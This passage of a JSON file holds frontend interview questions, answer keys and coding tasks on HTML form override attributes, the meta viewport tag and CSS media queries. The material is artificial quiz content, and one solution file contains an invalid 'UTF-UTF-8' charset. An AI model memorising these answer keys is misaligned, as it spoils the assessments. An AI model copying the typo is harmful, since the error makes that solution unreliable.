          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_form_overrides_4",
          "topic": "HTML Form Overriding Attributes",
          "level": "hard",
          "type": "code",
          "question": "Implement an HTML form with two submit buttons. The form's default submission should go to `/search` using the `GET` method. The second button, labeled 'Save Profile', should submit data to `/profile` using the `POST` method and open the response in a new tab.",
          "answer": "```html\n<form action=\"/search\" method=\"get\">\n  <label for=\"query\">Search Query:</label>\n  <input type=\"text\" id=\"query\" name=\"q\">\n  <br><br>\n  <label for=\"username\">Profile Name:</label>\n  <input type=\"text\" id=\"username\" name=\"username\">\n  <br><br>\n  <button type=\"submit\">Perform Search</button>\n  <button type=\"submit\" formmethod=\"post\" formaction=\"/profile\" formtarget=\"_blank\">Save Profile</button>\n</form>\n```",
          "options": [],
          "analysisPoints": [
            "Tests practical application of `formaction`, `formmethod`, and `formtarget`.",
            "Requires correct HTML syntax for forms and buttons."
          ],
          "keyConcepts": [
            "formaction",
            "formmethod",
            "formtarget",
            "HTML forms",
            "HTTP methods"
          ],
          "evaluationCriteria": [
            "Correct usage of all specified overriding attributes.",
            "Proper HTML structure."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Forms",
            "Coding",
            "Hard"
          ],
          "prerequisites": [
            "html_forms",
            "http_methods"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_form_overrides_5",
          "topic": "HTML Form Overriding Attributes",
          "level": "easy",
          "type": "flashcard",
          "question": "Which form attribute is overridden by `formenctype` on a submit button?",
          "answer": "The `enctype` attribute of the parent `<form>` element.",
          "options": [],
          "analysisPoints": [
            "Tests direct recall of attribute relationships."
          ],
          "keyConcepts": [
            "formenctype",
            "enctype",
            "HTML forms"
          ],
          "evaluationCriteria": [
            "Accurate identification of the overridden attribute."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Forms",
            "Attributes",
            "Flashcard"
          ],
          "prerequisites": [
            "html_forms"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_viewport_1",
          "topic": "Meta Viewport Tag",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of `width=device-width` in the meta viewport tag?",
          "answer": "It sets the width of the viewport to the width of the device's screen, preventing mobile browsers from scaling pages down.",
          "options": [],
          "analysisPoints": [
            "Checks fundamental understanding of viewport scaling.",
            "Ensures recognition of `device-width`'s role in responsive design."
          ],
          "keyConcepts": [
            "Meta viewport",
            "Responsive design",
            "Device-width"
          ],
          "evaluationCriteria": [
            "Correctly identifies the function and benefit."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Responsive Design",
            "Viewport",
            "Flashcard"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_viewport_2",
          "topic": "Meta Viewport Tag",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following `meta` viewport configurations is generally recommended for modern responsive web design, prioritizing accessibility?",
          "answer": "`<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">`",
          "options": [
            "`<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">`",
            "`<meta name=\"viewport\" content=\"initial-scale=1.0\">`",
            "`<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">`",
            "`<meta name=\"viewport\" content=\"width=980px, user-scalable=yes\">`"
          ],
          "analysisPoints": [
            "Tests understanding of best practices for meta viewport.",
            "Highlights the importance of accessibility and avoiding zoom restrictions.",
            "Distinguishes correct attribute usage from common pitfalls."
          ],
          "keyConcepts": [
            "Meta viewport",
            "Accessibility",
            "Responsive design",
            "initial-scale",
            "user-scalable",
            "maximum-scale"
          ],
          "evaluationCriteria": [
            "Selection of the most accessible and effective viewport setting.",
            "Understanding why zoom restrictions are harmful."
          ],
          "example": "The option `<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">` is the standard and recommended practice. It ensures the page scales correctly to the device width and allows users to zoom, which is crucial for accessibility. Options that restrict zooming (`maximum-scale=1.0`, `user-scalable=no`) are generally discouraged, and simply setting `initial-scale` without `width=device-width` might not prevent mobile browsers from rendering at a desktop width initially.",
          "tags": [
            "HTML",
            "Responsive Design",
            "Viewport",
            "MCQ",
            "Accessibility"
          ],
          "prerequisites": [
            "html_basics",
            "responsive_design_intro"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_viewport_3",
          "topic": "Meta Viewport Tag",
          "level": "medium",
          "type": "open",
          "question": "Explain the potential accessibility implications of using `user-scalable=no` or `maximum-scale=1.0` in the meta viewport tag.",
          "answer": "Using `user-scalable=no` or `maximum-scale=1.0` in the meta viewport tag significantly harms accessibility, particularly for users with visual impairments or certain motor disabilities. Many users rely on the ability to zoom into web content to read smaller text, view images more clearly, or interact with small touch targets. Disabling zooming prevents them from doing this, making the content unreadable or unusable. This violates WCAG (Web Content Accessibility Guidelines) principles, which advocate for flexible presentation and user control. It can lead to frustration and exclude a significant portion of users from accessing the information or functionality of the website.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of accessibility best practices.",
            "Requires explanation of *why* certain viewport settings are problematic.",
            "Connects technical settings to user impact."
          ],
          "keyConcepts": [
            "Meta viewport",
            "Accessibility",
            "WCAG",
            "User experience",
            "Zooming"
          ],
          "evaluationCriteria": [
            "Clear explanation of negative accessibility impact.",
            "Mention of specific user groups affected (e.g., visually impaired).",
            "Reference to web accessibility guidelines (optional but good)."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Accessibility",
            "Responsive Design",
            "Open-ended"
          ],
          "prerequisites": [
            "html_basics",
            "accessibility_fundamentals"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_viewport_4",
          "topic": "Meta Viewport Tag",
          "level": "easy",
          "type": "code",
          "question": "Write the HTML `<meta>` tag that sets the viewport width to the device width and the initial zoom level to 1.0.",
          "answer": "```html\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n```",
          "options": [],
          "analysisPoints": [
            "Tests direct recall of the standard meta viewport tag syntax.",
            "Ensures correct attribute values."
          ],
          "keyConcepts": [
            "Meta viewport",
            "width=device-width",
            "initial-scale=1.0"
          ],
          "evaluationCriteria": [
            "Correct HTML syntax.",
            "Accurate content attribute value."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Responsive Design",
            "Viewport",
            "Coding",
            "Easy"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_viewport_5",
          "topic": "Meta Viewport Tag",
          "level": "easy",
          "type": "flashcard",
          "question": "What does `initial-scale=1.0` in the meta viewport tag mean?",
          "answer": "It sets the initial zoom level when the page is first loaded, ensuring no zoom is applied and 1 CSS pixel corresponds to 1 device-independent pixel.",
          "options": [],
          "analysisPoints": [
            "Tests recall of a key viewport attribute's function."
          ],
          "keyConcepts": [
            "initial-scale",
            "Viewport",
            "Zoom level"
          ],
          "evaluationCriteria": [
            "Correctly defines the attribute's effect."
          ],
          "example": null,
          "tags": [
            "HTML",
            "Responsive Design",
            "Viewport",
            "Flashcard"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_media_query_1",
          "topic": "CSS Media Queries",
          "level": "easy",
          "type": "flashcard",
          "question": "What CSS rule is used to define a media query?",
          "answer": "`@media` rule.",
          "options": [],
          "analysisPoints": [
            "Tests basic syntax knowledge."
          ],
          "keyConcepts": [
            "Media queries",
            "CSS syntax"
          ],
          "evaluationCriteria": [
            "Correct identification of the CSS rule."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Media Queries",
            "Basic",
            "Flashcard"
          ],
          "prerequisites": [
            "css_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_media_query_2",
          "topic": "CSS Media Queries",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following media queries would apply styles specifically when a user has dark mode enabled in their operating system preferences?",
          "answer": "`@media (prefers-color-scheme: dark)`",
          "options": [
            "`@media (color-scheme: dark)`",
            "`@media (display-mode: dark)`",
            "`@media (prefers-color-scheme: dark)`",
            "`@media (theme: dark)`"
          ],
          "analysisPoints": [
            "Tests knowledge of specific media features.",
            "Distinguishes correct syntax from plausible but incorrect options."
          ],
          "keyConcepts": [
            "Media queries",
            "prefers-color-scheme",
            "Dark mode"
          ],
          "evaluationCriteria": [
            "Accurate identification of the media feature for dark mode."
          ],
          "example": "The `prefers-color-scheme` media feature is specifically designed to detect whether the user has requested the system to use a light or dark color theme. Therefore, `@media (prefers-color-scheme: dark)` is the correct way to apply styles for dark mode.",
          "tags": [
            "CSS",
            "Media Queries",
            "MCQ",
            "Dark Mode"
          ],
          "prerequisites": [
            "css_media_queries_intro"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_media_query_3",
          "topic": "CSS Media Queries",
          "level": "medium",
          "type": "open",
          "question": "You are designing a responsive layout. Explain the difference between using `min-width` and `max-width` in media queries for defining breakpoints. When might you choose one over the other?",
          "answer": "The difference between `min-width` and `max-width` in media queries lies in the direction of the breakpoint. `min-width` applies styles when the viewport is *at least* the specified width or wider. This approach is often called 'mobile-first,' where you define base styles for small screens and then add styles for larger screens incrementally.\n\n`max-width` applies styles when the viewport is *at most* the specified width or narrower. This is often called 'desktop-first,' where you define base styles for large screens and then override or adjust them for smaller screens.\n\n**When to choose:**\n*   **`min-width` (Mobile-First):** Generally preferred. You start with a simple, baseline design for small screens (mobile) and then progressively enhance it for larger screens. This often leads to better performance on mobile devices (less CSS to load initially) and a more robust, scalable design process, as adding complexity is easier than removing it. It also aligns well with the modern emphasis on mobile browsing.\n*   **`max-width` (Desktop-First):** Can be used if an existing desktop design needs to be adapted for smaller screens, or if the design process naturally starts from a desktop view. However, it can sometimes lead to more complex CSS overrides for smaller screens and potentially larger initial CSS payloads for mobile users.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of core media query concepts (`min-width` vs `max-width`).",
            "Requires explanation of 'mobile-first' vs 'desktop-first' approaches.",
            "Prompts discussion of practical implications and best practices."
          ],
          "keyConcepts": [
            "Media queries",
            "min-width",
            "max-width",
            "Mobile-first",
            "Desktop-first",
            "Responsive design"
          ],
          "evaluationCriteria": [
            "Clear definition of `min-width` and `max-width` behavior.",
            "Accurate explanation of mobile-first and desktop-first methodologies.",
            "Justification for choosing one over the other, including benefits/drawbacks."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Media Queries",
            "Responsive Design",
            "Open-ended",
            "Best Practices"
          ],
          "prerequisites": [
            "css_media_queries_intro"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_media_query_4",
          "topic": "CSS Media Queries",
          "level": "hard",
          "type": "code",
          "question": "Write CSS media queries to achieve the following:\n1.  For screens between 768px and 1023px wide (inclusive), set the body background to `lightblue`.\n2.  For screens wider than or equal to 1024px AND in landscape orientation, set the body background to `darkgreen` and text color to `white`.\n3.  For any screen where the `device-aspect-ratio` is `4/3`, set the body padding to `20px`.\n4.  On high-resolution displays (2dppx or more), make images with class `icon` display a higher-resolution version `icon@2x.png`.",
          "answer": "```css\n/* 1. For screens between 768px and 1023px wide */\n@media (min-width: 768px) and (max-width: 1023px) {\n  body {\n    background-color: lightblue;\n  }\n}\n\n/* 2. For screens wider than or equal to 1024px AND in landscape orientation */\n@media (min-width: 1024px) and (orientation: landscape) {\n  body {\n    background-color: darkgreen;\n    color: white;\n  }\n}\n\n/* 3. For any screen where the device-aspect-ratio is 4/3 */\n@media screen and (device-aspect-ratio: 4/3) {\n  body {\n    padding: 20px;\n  }\n}\n\n/* 4. On high-resolution displays (2dppx or more) */\n@media screen and (min-resolution: 2dppx) {\n  .icon {\n    content: url('icon@2x.png'); /* Assumes the image is naturally scaled */\n    /* You might also need: width: 50px; height: 50px; if the 2x image is twice the size and you want to display it at original size */\n  }\n}\n\n/* For broader compatibility with high-res displays, you might add vendor prefixes for -webkit-min-device-pixel-ratio */\n/* @media screen and (-webkit-min-device-pixel-ratio: 2), screen and (min-resolution: 2dppx) { ... } */\n```",
          "options": [],
          "analysisPoints": [
            "Tests ability to combine multiple media features (`and`).",
            "Checks understanding of range-based breakpoints.",
            "Evaluates knowledge of less common but important media features (`orientation`, `device-aspect-ratio`, `min-resolution`).",
            "Assesses practical application for serving high-res images."
          ],
          "keyConcepts": [
            "Media queries",
            "min-width",
            "max-width",
            "orientation",
            "device-aspect-ratio",
            "min-resolution",
            "Responsive images"
          ],
          "evaluationCriteria": [
            "Correct syntax for all media queries.",
            "Accurate use of logical operators (`and`).",
            "Appropriate application of `content` property for responsive images."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Media Queries",
            "Coding",
            "Hard",
            "Responsive Design"
          ],
          "prerequisites": [
            "css_media_queries_intro",
            "css_properties"
          ],
          "complexity": 9,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_media_query_5",
          "topic": "CSS Media Queries",
          "level": "medium",
          "type": "mcq",
          "question": "Which CSS snippet would style a `div` element to be 50% width on tablet devices (viewport width between 768px and 1024px, exclusive of 1024px) and 80% width on mobile devices (viewport width less than 768px)? Assume base styles for mobile are defined outside any media query.",
          "answer": "```css\ndiv {\n  width: 80%; /* Mobile devices */\n}\n\n@media (min-width: 768px) and (max-width: 1023px) {\n  div {\n    width: 50%; /* Tablet devices */\n  }\n}\n```",
          "options": [
            "```css\ndiv {\n  width: 80%; /* Mobile devices */\n}\n\n@media (min-width: 768px) and (max-width: 1023px) {\n  div {\n    width: 50%; /* Tablet devices */\n  }\n}\n```",
            "```css\ndiv {\n  width: 50%;\n}\n\n@media (max-width: 767px) {\n  div {\n    width: 80%;\n  }\n}\n\n@media (min-width: 768px) and (max-width: 1024px) {\n  div {\n    width: 50%;\n  }\n}\n```",
            "```css\ndiv {\n  width: 80%;\n}\n\n@media (min-width: 768px) {\n  div {\n    width: 50%;\n  }\n}\n```",
            "```css\ndiv {\n  width: 50%;\n}\n\n@media (min-width: 768px) and (max-width: 1024px) {\n  div {\n    width: 80%;\n  }\n}\n```"
          ],
          "analysisPoints": [
            "Tests the ability to correctly define breakpoint ranges using `min-width` and `max-width`.",
            "Evaluates understanding of CSS cascade and mobile-first approach implication.",
            "Checks for correct logical combination of media features."
          ],
          "keyConcepts": [
            "Media queries",
            "min-width",
            "max-width",
            "Breakpoint ranges",
            "CSS cascade",
            "Mobile-first"
          ],
          "evaluationCriteria": [
            "Correctly applied `min-width` and `max-width` for the specified ranges.",
            "Adherence to mobile-first principle where base styles are for mobile."
          ],
          "example": "The correct answer demonstrates a mobile-first approach. The `div` has a base width of `80%` (for mobile, i.e., less than 768px). The media query `@media (min-width: 768px) and (max-width: 1023px)` specifically targets the tablet range (768px to 1023px, as 1024px is exclusive) and overrides the width to `50%` for that range. Other options either use incorrect ranges, don't adhere to mobile-first implicitly, or use incorrect logical operators.",
          "tags": [
            "CSS",
            "Media Queries",
            "MCQ",
            "Responsive Design",
            "Intermediate"
          ],
          "prerequisites": [
            "css_media_queries_intro",
            "css_cascade"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_media_query_6",
          "topic": "CSS Media Queries",
          "level": "easy",
          "type": "flashcard",
          "question": "What does `2dppx` refer to in `min-resolution: 2dppx`?",
          "answer": "`2dppx` means 2 dots per pixel unit (device-independent pixel). It is a unit for resolution, often used to target high-resolution (Retina) displays, indicating that there are 2 physical device pixels for every 1 CSS pixel.",
          "options": [],
          "analysisPoints": [
            "Tests recall of resolution units in media queries."
          ],
          "keyConcepts": [
            "Media queries",
            "resolution",
            "dppx",
            "Retina display"
          ],
          "evaluationCriteria": [
            "Correctly defines `dppx` and its purpose."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Media Queries",
            "Flashcard",
            "Resolution"
          ],
          "prerequisites": [
            "css_media_queries_intro"
          ],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_media_query_7",
          "topic": "CSS Media Queries",
          "level": "medium",
          "type": "open",
          "question": "Discuss the advantages of using `em` or `rem` units for media query breakpoints compared to `px` units.",
          "answer": "Using `em` or `rem` units for media query breakpoints offers significant advantages in terms of accessibility and flexibility compared to `px` units:\n\n1.  **Accessibility (User Preference):** `em` and `rem` units are relative to font sizes. `em` is relative to the font-size of its parent element (or the element itself for `font-size` property), while `rem` is relative to the root `html` element's `font-size`. If a user has changed their browser's default font size setting (e.g., for visual impairment), breakpoints defined in `em` or `rem` will adjust accordingly. This means the layout will break and adapt at points that are meaningful *to the user's preferred text size*, rather than rigidly at fixed pixel widths. This provides a more adaptive and accessible experience.\n2.  **Maintainability and Scalability:** When using `rem` for breakpoints (and often for other sizing), changing the base font size on the `html` element can proportionally scale the entire layout and its breakpoints. This makes it easier to manage and scale the design across different contexts or for future redesigns without having to individually adjust numerous pixel values.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of CSS units in the context of responsive design.",
            "Requires discussion of accessibility implications.",
            "Highlights practical benefits for development and maintenance."
          ],
          "keyConcepts": [
            "Media queries",
            "em",
            "rem",
            "px",
            "Accessibility",
            "Responsive design",
            "CSS units"
          ],
          "evaluationCriteria": [
            "Clear explanation of `em`/`rem` relativity.",
            "Emphasis on accessibility as a primary advantage.",
            "Discussion of maintainability benefits."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Media Queries",
            "Responsive Design",
            "Open-ended",
            "Best Practices"
          ],
          "prerequisites": [
            "css_units",
            "css_media_queries_intro"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_form_overrides_1",
          "title": "Dynamic Form Submission with Overrides",
          "description": "\nCreate an HTML page with a form that demonstrates the use of form overriding attributes. The form should:\n\n1.  Have a default `action` to `/default-action` and `method` as `GET`.\n2.  Include an `input` field for user input (e.g., 'item name').\n3.  Include two submit buttons:\n    *   The first button, labeled 'Search Item', should use the form's default `action` and `method`.\n    *   The second button, labeled 'Add New Item', must submit the form data to a different URL (`/api/add-item`) using the `POST` method and open the response in a new blank tab/window.\n\nVerify that clicking each button triggers the specified behavior by inspecting network requests or observing browser tab behavior (you can use dummy URLs for demonstration).\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Form Overrides Demo</title>\n  <style>\n    body { font-family: Arial, sans-serif; margin: 20px; }\n    form { border: 1px solid #ccc; padding: 20px; border-radius: 5px; max-width: 400px; }\n    label, input, button { display: block; margin-bottom: 10px; }\n    button { padding: 8px 15px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }\n    button:hover { background-color: #0056b3; }\n  </style>\n</head>\n<body>\n  <h2>Dynamic Form Submission</h2>\n  <form action=\"/default-action\" method=\"get\">\n    <label for=\"item-name\">Item Name:</label>\n    <input type=\"text\" id=\"item-name\" name=\"item\" placeholder=\"e.g., Laptop\">\n\n    <!-- TODO: Add the two submit buttons as per requirements -->\n\n  </form>\n</body>\n</html>",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Form Overrides Demo</title>\n  <style>\n    body { font-family: Arial, sans-serif; margin: 20px; }\n    form { border: 1px solid #ccc; padding: 20px; border-radius: 5px; max-width: 400px; }\n    label, input, button { display: block; margin-bottom: 10px; }\n    button { padding: 8px 15px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }\n    button:hover { background-color: #0056b3; }\n    button + button { margin-top: 15px; }\n  </style>\n</head>\n<body>\n  <h2>Dynamic Form Submission</h2>\n  <form action=\"/default-action\" method=\"get\">\n    <label for=\"item-name\">Item Name:</label>\n    <input type=\"text\" id=\"item-name\" name=\"item\" placeholder=\"e.g., Laptop\">\n\n    <button type=\"submit\">Search Item</button>\n    <button type=\"submit\" formaction=\"/api/add-item\" formmethod=\"post\" formtarget=\"_blank\">Add New Item</button>\n\n  </form>\n  <p><em>(Note: URLs are dummy for demonstration. Check network tab for method/action or new tab for target.)</em></p>\n</body>\n</html>",
          "testCases": [
            "Clicking 'Search Item' button: The browser should navigate to `/default-action?item=<input_value>` using the GET method (check browser URL or network tab).",
            "Clicking 'Add New Item' button: The browser should attempt to submit to `/api/add-item` using the POST method, and a new blank tab/window should open. (Check network tab for method/URL, and browser for new tab)."
          ],
          "hints": [
            "Remember that `type=\"submit\"` is crucial for buttons to trigger form submission.",
            "The overriding attributes (`formaction`, `formmethod`, `formtarget`) are applied directly to the `button` or `input[type=\"submit\"]` element.",
            "You can inspect the network requests in your browser's developer tools (usually F12 -> Network tab) to verify the HTTP method and URL."
          ],
          "tags": [
            "HTML",
            "Forms",
            "Attributes",
            "Frontend Interview",
            "Web Development"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "html_forms",
            "http_methods"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "formaction",
            "formmethod",
            "formtarget",
            "form_element"
          ]
        },
        {
          "id": "task_meta_viewport_1",
          "title": "Configure Responsive Page with Meta Viewport",
          "description": "\nCreate a basic HTML document that is correctly configured for responsive display on various devices.\n\nYour task is to:\n\n1.  Set up a standard HTML5 document structure.\n2.  Include the essential `<meta name=\"viewport\">` tag to ensure proper scaling and initial zoom level.\n3.  Add some basic content (e.g., a heading, a paragraph).\n4.  Optionally, include a simple CSS rule to demonstrate responsiveness (e.g., `body { font-size: 16px; }` and later adjusted by a media query for larger screens, but the core of this task is the meta tag).\n\nVerify the responsiveness by resizing your browser window or using browser developer tools to simulate mobile devices.\n",
          "difficulty": "easy",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <!-- TODO: Add the meta viewport tag here -->\n  <title>Responsive Page</title>\n  <style>\n    body {\n      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n      margin: 20px;\n      line-height: 1.6;\n      color: #333;\n    }\n    h1 { color: #0056b3; }\n    p { max-width: 600px; }\n  </style>\n</head>\n<body>\n  <h1>My Awesome Responsive Page</h1>\n  <p>This page is designed to adapt to various screen sizes. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\n</body>\n</html>",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Responsive Page</title>\n  <style>\n    body {\n      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n      margin: 20px;\n      line-height: 1.6;\n      color: #333;\n    }\n    h1 { color: #0056b3; }\n    p { max-width: 600px; }\n\n    /* Optional: Add a simple media query to observe changes */\n    @media (max-width: 600px) {\n      body {\n        margin: 10px;\n        font-size: 0.9em;\n      }\n    }\n  </style>\n</head>\n<body>\n  <h1>My Awesome Responsive Page</h1>\n  <p>This page is designed to adapt to various screen sizes. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\n</body>\n</html>",
          "testCases": [
            "Open the HTML file in a web browser.",
            "Resize the browser window from a very wide desktop view to a very narrow mobile view.",
            "Use your browser's developer tools (e.g., Chrome DevTools device toolbar) to simulate various mobile devices (e.g., iPhone SE, Pixel 5).",
            "Observe that the content scales appropriately and text remains readable without needing to pinch-zoom (if zoom is allowed)."
          ],
          "hints": [
            "The `meta` tag should be placed within the `<head>` section of your HTML document.",
            "The two most important `content` attributes for basic responsiveness are `width=device-width` and `initial-scale=1.0`.",
            "Avoid `user-scalable=no` or `maximum-scale=1.0` unless there's an extremely specific, accessibility-reviewed reason."
          ],
          "tags": [
            "HTML",
            "Responsive Design",
            "Viewport",
            "Frontend Interview",
            "Web Basics"
          ],
          "timeEstimate": 15,
          "prerequisites": [
            "html_structure"
          ],
          "complexity": 3,
          "interviewRelevance": 9,
          "learningPath": "beginner",
          "relatedConcepts": [
            "meta_viewport",
            "width_device-width",
            "initial-scale"
          ]
        },
        {
          "id": "task_media_queries_1",
          "title": "Responsive Container with Dynamic Styling",
          "description": "\nImplement a responsive design for a simple container `div` using CSS media queries. The container should visually change based on screen width and user color scheme preference.\n\n**Requirements:**\n\n1.  **Base Styles (Mobile-First):** For viewports less than `768px`:\n    *   The `div` should have a `background-color` of `lightcoral`.\n    *   `font-size` of `16px`.\n    *   `width` of `90%`.\n2.  **Tablet Styles:** For viewports from `768px` up to `1023px` (inclusive):\n    *   `background-color` of `lightgreen`.\n    *   `font-size` of `18px`.\n    *   `width` of `70%`.\n3.  **Desktop Styles:** For viewports `1024px` and wider:\n    *   `background-color` of `lightblue`.\n    *   `font-size` of `20px`.\n    *   `width` of `50%`.\n4.  **Dark Mode Preference:** When the user's system `prefers-color-scheme` is `dark`, the `body` background should be `#333` and its text `color` should be `white`, regardless of viewport size. This rule should override base body styles.\n5.  **High-Resolution Display:** For screens with `min-resolution: 2dppx`, change the `border` of the container `div` to `5px solid purple`.\n\nYour solution should be robust enough to test by resizing the browser and toggling your system's dark/light mode.\n",
          "difficulty": "hard",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Responsive Container</title>\n  <link rel=\"stylesheet\" href=\"styles.css\">\n</head>\n<body>\n  <div class=\"container\">\n    <h1>Responsive Demo</h1>\n    <p>Watch me change based on your screen size and system theme!</p>\n  </div>\n</body>\n</html>\n\n/* styles.css */\nbody {\n  font-family: sans-serif;\n  margin: 20px;\n  background-color: #f0f0f0; /* Default light background */\n  color: #333;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  min-height: 90vh;\n}\n\n.container {\n  padding: 20px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n  transition: all 0.3s ease-in-out;\n\n  /* TODO: Add base (mobile) styles here */\n\n}\n\n/* TODO: Add tablet, desktop, dark mode, and high-res media queries */\n\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Responsive Container</title>\n  <link rel=\"stylesheet\" href=\"styles.css\">\n</head>\n<body>\n  <div class=\"container\">\n    <h1>Responsive Demo</h1>\n    <p>Watch me change based on your screen size and system theme!</p>\n  </div>\n</body>\n</html>\n\n/* styles.css */\nbody {\n  font-family: sans-serif;\n  margin: 20px;\n  background-color: #f0f0f0; /* Default light background */\n  color: #333;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  min-height: 90vh;\n}\n\n.container {\n  padding: 20px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n  transition: all 0.3s ease-in-out;\n\n  /* Base (Mobile-First) Styles */\n  background-color: lightcoral;\n  font-size: 16px;\n  width: 90%;\n}\n\n/* Tablet Styles */\n@media (min-width: 768px) and (max-width: 1023px) {\n  .container {\n    background-color: lightgreen;\n    font-size: 18px;\n    width: 70%;\n  }\n}\n\n/* Desktop Styles */\n@media (min-width: 1024px) {\n  .container {\n    background-color: lightblue;\n    font-size: 20px;\n    width: 50%;\n  }\n}\n\n/* Dark Mode Preference */\n@media (prefers-color-scheme: dark) {\n  body {\n    background-color: #333;\n    color: white;\n  }\n  .container {\n    box-shadow: 0 4px 8px rgba(255,255,255,0.1); /* Adjust shadow for dark mode */\n  }\n}\n\n/* High-Resolution Display */\n@media screen and (min-resolution: 2dppx) {\n  .container {\n    border: 5px solid purple;\n  }\n}",
          "testCases": [
            "**Mobile Viewport (< 768px):** Resize browser window to be small. The container should be `lightcoral`, `16px` font, and `90%` width.",
            "**Tablet Viewport (768px - 1023px):** Resize browser window to be in this range. The container should be `lightgreen`, `18px` font, and `70%` width.",
            "**Desktop Viewport (>= 1024px):** Resize browser window to be large. The container should be `lightblue`, `20px` font, and `50%` width.",
            "**Dark Mode:** Toggle your operating system's dark mode setting. The `body` background should become `#333` and text `white` (overriding the other background colors).",
            "**High-Resolution Display:** If you have a Retina/high-DPI display, or simulate one in dev tools, the container should get a `5px solid purple` border (this will apply in addition to other styles)."
          ],
          "hints": [
            "Remember the mobile-first approach: define default styles for the smallest screens first, then use `min-width` for larger breakpoints.",
            "To target a range (e.g., tablet), combine `min-width` and `max-width` using the `and` keyword.",
            "The `prefers-color-scheme` media feature is independent of screen width; it can be combined with other queries or used standalone.",
            "Use your browser's developer tools (e.g., Chrome DevTools -> Toggle device toolbar) to easily test different screen sizes and enable/disable dark mode simulation (often under 'Rendering' or 'More tools')."
          ],
          "tags": [
            "CSS",
            "Media Queries",
            "Responsive Design",
